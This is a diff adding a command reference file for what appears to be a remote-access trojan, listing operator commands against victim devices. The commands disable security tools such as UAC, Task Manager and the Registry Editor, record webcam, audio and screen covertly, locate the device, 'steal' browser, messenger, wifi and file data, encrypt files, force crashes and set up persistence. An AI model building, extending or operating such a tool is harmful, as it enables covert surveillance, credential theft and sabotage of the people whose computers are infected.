@@ -1,0 +1,28 @@
+typing in terminal language
+
+ping "{device_name}" - Ping device
+locate "{device_name}" -ip/-gps/-igps - locate device via gps/ip-Adress
+taskmgr "{device_name}"  -opn/-cls/-on/-off - block/unblock/open/close Task Manager
+uac "{device_name}" -on/-off - Enables/Disables UAC, then crashes the system and restarts to apply changes
+regedit "{device_name}" -on/-off - Enables or disables Registry Editor
+explorer "{device_name}" -opn/-cls/-on/-off enable/disable/open/close Explorer
+conpan "{device_name}" -on/-off enable/disable Control Panel
+blockurl "{device_name}" -all/"{website_name}" - block all websites or specific website
+unblockurl "{device_name}" -all/"{website_name}" - unblock all websites or specific website
+opensite "{device_name}" "{site_name}"
+blockprcss "{device_name}" -add "{process_name}"/-strt/-stp/-del "{process_name}"/-del all - use process blocker
+video "{device_name}" {seconds} -mp4/-mov - record video
+audio "{device_name}" {seconds} -mp3/-wav - record audio
+wbcmimg "{device_name}" -jpg/-png - take picture from webcam
+scrnsht "{device_name}" {screen_number_if_multiple} -jpg/-png - take screenshot from screen
+scrnrcd "{device_name}" {seconds} -mp4/-mov - record screen
+antivrs "{device_name}" - check antiviruses
+pcinfo "{device_name}" - get device info
+steal "{device_name}" -browser {browser_number}/-launcher {launcher_number}/-docs/-applist/-wifi/-messenger {messenger_number}/-file "{file path}"/-dir "{directory}" - steal data
+onchat "{device_name}" -killafter {seconds}/-fullscreen/-unclosable/ - online chat with device
+remoteplay "{device_name}" -full/-screenshare {screen_number}/-keyboard {key_combination}/-volume {volume_number}/-shutdown/-restart/-bsod/-logout/-mousebuttonchange/-crazymouse/-changewallpaper/-altf4/-todesktop/-screamer/-textonscreen/ - remote control parameters on device and play with device
+dir "{device_name}" -exe/-full/-newfolder/-delfolder "{folder_path}"/-delfile "{file_path}"/-openfile "{file_path}"/-goto "{path}"/-cutfile "{file_path}" /-renamefile "{file_path}" "{new_file_name}"/-getsize "{file_path}"/-encryptfile "{file_path}" - play with directories and files
+updatecode -all/"{device_name}"- apply update (connects to google cloud to download latest update)
+startup "{device_name}" -reg/-taskmgr/-services/-tasksheduler -on/-off - startup behavior
+sendfile -all/"{device_name}" -vid/-audio/-pic/-file "{file_path}" - sends file to device and saves there
+help -getdevicename "{ip-adress}"/-commandslist/-whatsapplied (see what settings applied) - help to get around
